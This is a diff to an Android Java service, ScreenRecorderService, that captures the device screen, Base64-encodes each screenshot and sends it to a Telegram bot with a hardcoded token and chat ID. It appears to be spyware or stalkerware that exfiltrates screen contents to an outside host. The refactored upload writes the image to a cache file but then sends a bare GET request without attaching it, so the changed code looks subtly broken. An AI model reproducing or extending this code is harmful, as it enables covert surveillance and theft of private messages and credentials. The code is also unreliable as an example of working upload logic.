@@ -15,7 +15,6 @@ import android.media.ImageReader;
 import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
 import android.os.Build;
-import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
 import android.util.Base64;
@@ -164,7 +163,6 @@ public class ScreenRecorderService extends Service {
                 byte[] imageBytes = baos.toByteArray();
 
                 String encodedImage = Base64.encodeToString(imageBytes, Base64.DEFAULT);
-
                 sendScreenshotToTelegram(encodedImage);
 
                 image.close();
@@ -180,36 +178,28 @@ public class ScreenRecorderService extends Service {
             String timestamp = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss",
                 Locale.getDefault()).format(new Date());
 
-            String boundary = "Boundary" + System.currentTimeMillis();
-
-            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN +
-                           "/sendPhoto?chat_id=" + CHAT_ID +
-                           "&caption=" + URLEncoder.encode(
-                               "📱 Screen Captured
-Time: " + timestamp, "UTF-8"));
-
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setDoOutput(true);
-            conn.setRequestMethod("POST");
-            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
-
             File tempFile = new File(getCacheDir(), "screen.jpg");
             FileOutputStream fos = new FileOutputStream(tempFile);
             fos.write(Base64.decode(encodedImage, Base64.DEFAULT));
             fos.close();
 
+            String caption = URLEncoder.encode("Screen Captured\nTime: " + timestamp, "UTF-8");
+            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN
+                + "/sendPhoto?chat_id=" + CHAT_ID + "&caption=" + caption;
+
+            URL url = new URL(urlStr);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
             conn.getInputStream();
             conn.disconnect();
 
         } catch (Exception e) {
             try {
-                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN +
-                               "/sendMessage?chat_id=" + CHAT_ID +
-                               "&text=" + URLEncoder.encode(
-                                   "📱 Screen Captured at " +
-                                   new SimpleDateFormat("HH:mm:ss",
-                                       Locale.getDefault()).format(new Date()), "UTF-8");
-                URL url = new URL(urlStr);
+                String timestamp = new SimpleDateFormat("HH:mm:ss",
+                    Locale.getDefault()).format(new Date());
+                String text = URLEncoder.encode("Screen Captured at " + timestamp, "UTF-8");
+                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN
+                    + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + text);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("GET");
                 conn.getInputStream();
